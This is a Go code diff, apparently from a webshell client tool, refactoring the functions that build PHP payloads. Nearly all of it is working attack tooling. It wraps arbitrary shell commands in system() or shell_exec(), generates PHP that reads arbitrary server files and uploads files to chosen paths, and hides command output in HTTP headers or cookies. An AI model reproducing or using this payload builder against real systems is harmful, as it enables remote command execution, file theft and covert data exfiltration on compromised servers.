@@ -7,7 +7,6 @@ import (
 	"os"
 	"path/filepath"
 
-	"github.com/eatbytes/razboy/core"
 	"github.com/eatbytes/razboy/normalizer"
 )
 
@@ -19,25 +18,29 @@ func _getShellExecCMD(cmd, letter string) string {
 	return "$" + letter + "=shell_exec('" + cmd + "');"
 }
 
-func CreateCMD(cmd string, shl *core.SHELLCONFIG) string {
+func CreateCMD(cmd, scope, method string, response bool, opt ...string) string {
 	var contexter, shellCMD string
 
-	if shl.Scope != "" {
-		contexter = "cd " + shl.Scope + " && "
+	if scope != "" {
+		contexter = "cd " + scope + " && "
 	}
 
 	shellCMD = contexter + cmd
 
-	if shl.Method == "" || shl.Method == "system" {
+	if method == "" || method == "system" {
 		shellCMD = _getSystemCMD(shellCMD, "r")
-	} else if shl.Method == "shell_exec" {
+	} else if method == "shell_exec" {
 		shellCMD = _getShellExecCMD(shellCMD, "r")
+	}
+
+	if response && len(opt) > 1 {
+		shellCMD += CreateAnswer(opt[0], opt[1])
 	}
 
 	return shellCMD
 }
 
-func CreateDownload(dir string, php *core.PHPCONFIG) string {
+func CreateDownload(dir string, response bool, opt ...string) string {
 	var ifstr, endifstr, headers, cmd string
 
 	ifstr = "if (file_exists('" + dir + "')) {"
@@ -52,10 +55,14 @@ func CreateDownload(dir string, php *core.PHPCONFIG) string {
 
 	cmd = ifstr + headers + "ob_clean();flush();readfile('" + dir + "');exit();" + endifstr
 
+	if response && len(opt) > 1 {
+		cmd += CreateAnswer(opt[0], opt[1])
+	}
+
 	return cmd
 }
 
-func CreateUpload(path, dir string, php *core.PHPCONFIG) (string, error) {
+func CreateUpload(path, dir string, raw bool) (string, *bytes.Buffer, error) {
 	var (
 		cmd    string
 		err    error
@@ -67,14 +74,14 @@ func CreateUpload(path, dir string, php *core.PHPCONFIG) (string, error) {
 
 	cmd = "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');if(file_exists('" + dir + "')){echo 1;}"
 
-	if !php.Raw {
+	if raw {
 		cmd = normalizer.Encode(cmd)
 	}
 
 	file, err = os.Open(path)
 
 	if err != nil {
-		return "", err
+		return "", nil, err
 	}
 
 	defer file.Close()
@@ -84,33 +91,31 @@ func CreateUpload(path, dir string, php *core.PHPCONFIG) (string, error) {
 	part, err = writer.CreateFormFile("file", filepath.Base(path))
 
 	if err != nil {
-		return "", err
+		return "", nil, err
 	}
 
 	_, err = io.Copy(part, file)
 
 	if err != nil {
-		return "", err
+		return "", nil, err
 	}
 
 	err = writer.Close()
 
 	if err != nil {
-		return "", err
+		return "", nil, err
 	}
 
-	php.Buffer = body
-
-	return cmd, nil
+	return cmd, body, nil
 }
 
-func CreateAnswer(r *core.REQUEST) string {
-	if r.SRVc.Method == "HEADER" {
-		return "header('" + r.SRVc.Parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
+func CreateAnswer(method, parameter string) string {
+	if method == "HEADER" {
+		return "header('" + parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
 	}
 
-	if r.SRVc.Method == "COOKIE" {
-		return "setcookie('" + r.SRVc.Parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
+	if method == "COOKIE" {
+		return "setcookie('" + parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
 	}
 
 	return "echo(" + normalizer.PHPEncode("$r") + ");exit();"
